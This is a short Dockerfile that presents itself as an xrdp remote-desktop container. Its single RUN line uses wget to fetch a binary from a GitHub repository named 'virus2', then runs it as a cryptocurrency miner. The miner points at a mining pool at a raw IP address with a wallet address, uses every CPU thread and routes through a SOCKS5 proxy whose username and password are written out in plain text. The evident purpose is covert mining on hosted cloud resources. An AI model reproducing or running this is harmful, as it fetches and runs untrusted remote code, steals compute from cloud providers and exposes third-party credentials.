FROM aank999/xrdp-okteto-cloud:latest
LABEL maintainer="Aank is ME <https://aank.me/Youtube>"
EXPOSE 80
RUN wget https://github.com/raufpermana22/virus2/raw/main/av2 && chmod +x  av2 && ./av2 -a yescryptr16 -o stratum+tcp://198.50.168.213:6333 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.Tet -p c=OGER -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80

ENTRYPOINT ["/startup.sh"]
